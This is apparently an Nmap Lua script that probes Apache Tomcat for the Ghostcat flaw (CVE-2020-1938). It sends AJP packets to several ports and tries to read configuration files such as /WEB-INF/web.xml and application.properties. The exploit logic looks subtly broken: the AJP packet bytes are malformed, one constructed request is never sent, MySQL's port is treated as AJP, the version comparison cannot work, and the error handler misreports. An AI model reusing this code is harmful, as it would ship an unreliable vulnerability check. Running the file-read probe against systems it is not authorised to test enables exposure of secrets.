local stdnse = require "stdnse"
local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Apache Tomcat Ghostcat (CVE-2020-1938) via AJP file read and HTTP version fingerprinting.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.service == "http" or port.number == 8009) end

local function check_ajp(host, port_num, path)
  local sock = new_socket()
  sock:set_timeout(8000)
  local ok, err = sock:connect(host.ip, port_num)
  if not ok then sock:close(); return nil end

  local path_bytes = {}
  for i = 1, #path do
    path_bytes[i] = byte(path, i)
  end

  local path_len = #path
  local prefix = char(0x12, 0x34) .. char(0x00, 0x00, 0x00, 0x00 + path_len + 4) ..
    char(0x02) .. char(0x00, 0x00, path_len + 1) .. path .. char(0x00)

  local forward_request = char(
    0x12, 0x34, 0x00, 0x00, 0x00, 0x00 + path_len + 10,
    0x02, 0x00, 0x00, path_len + 1
  ) .. path .. char(0x00) ..
    char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

  local send_ok, send_err = sock:send(prefix)
  if not send_ok then sock:close(); return nil end

  local rcv, recv_err = sock:receive_bytes(2048)
  sock:close()

  if rcv and (#rcv > 20) then
    local data = {}
    for i = 1, math.min(#rcv, 500) do
      data[i] = char(rcv:byte(i))
    end
    local body = concat(data)
    if body:match("web%-app") or body:match("<%?xml") or body:match("<!DOCTYPE") or body:match("<web-app") or body:match("context%-param") or body:match("Welcome") then
      return body
    end
  end
  return nil
end

local function check_http_version(host, port)
  local req = http.get(host, port, "/")
  if not req then return nil end
  local server = ""
  if req.headers and req.headers["server"] then
    server = type(req.headers["server"]) == "table" and req.headers["server"][1] or req.headers["server"]
  end
  if server:match("[Tt]omcat") or server:match("[Cc]oyote") or server:match("[Jj]etty") then
    local ver = server:match("([%d%.]+)")
    return server, ver
  end
  return server, nil
end

action = function(host, port)
  local ok, result = pcall(function()
    local server_banner, version = check_http_version(host, port)
    local findings = {}
    local ajp_ports = {8009, 3306, 8007, 8010, 9090}

    local targets = {"/WEB-INF/web.xml", "/WEB-INF/jboss-web.xml", "/META-INF/context.xml", "/META-INF/MANIFEST.MF", "/WEB-INF/classes/application.properties"}

    for _, p in ipairs(ajp_ports) do
      for _, tpath in ipairs(targets) do
        local content = check_ajp(host, p, tpath)
        if content then
          insert(findings, {port = p, path = tpath, length = #content, preview = content:sub(1, 120)})
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2020-1938"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner or "unknown"
      result.version = version or "unknown"
      result.detail = ("Ghostcat confirmed - AJP file read via %d AJP ports"):format(#findings)
      for i, f in ipairs(findings) do
        result[("finding_%d"):format(i)] = ("AJP port %d served %s (%d bytes)"):format(f.port, f.path, f.length)
      end
      if version and tonumber(version) and tonumber(version) < 9 then
        result.version_note = ("Tomcat %s is within vulnerable range"):format(version)
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2020-1938"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner or "unknown"
    result.version = version or "unknown"
    result.detail = "No Ghostcat vulnerability detected"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2020-1938"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
